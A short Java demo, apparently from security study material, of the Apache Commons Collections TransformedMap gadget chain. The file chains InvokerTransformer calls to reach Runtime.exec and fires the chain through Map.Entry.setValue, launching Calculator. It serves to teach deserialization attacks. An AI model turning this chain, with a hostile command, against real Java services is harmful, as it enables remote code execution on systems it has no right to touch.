package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {

	public static void main(String[] args) {
		String cmd = "open -a Calculator.app";

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 创建Map对象
		Map map = new HashMap();
		map.put("value", "value");

		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

		// transformedMap.put("v1", "v2");// 执行put也会触发transform

		// 遍历Map元素，并调用setValue方法
		for (Object obj : transformedMap.entrySet()) {
			Map.Entry entry = (Map.Entry) obj;

			// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
			entry.setValue("test");
		}

		System.out.println(transformedMap);
	}

}
